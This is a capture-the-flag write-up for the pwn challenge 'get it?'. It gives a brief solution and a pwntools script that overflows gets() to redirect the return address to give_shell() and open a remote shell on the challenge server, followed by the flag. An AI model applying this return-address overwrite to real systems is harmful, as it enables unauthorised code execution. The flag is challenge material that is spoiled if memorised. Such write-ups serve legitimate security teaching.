## get it? 50 (pwn)

### Solution

use `gets()` to overwrite return address to `give_shell()`

### Exploit

```python
#!/usr/bin/env python3
from pwn import *

context(arch="amd64")

r = remote("pwn.chal.csaw.io", 9001)
b = ELF("get_it")

r.sendline(b"a" * 40 + p64(b.symbols[b"give_shell"]))
r.interactive()
```

### Flag

```
flag{y0u_deF_get_itls}
```
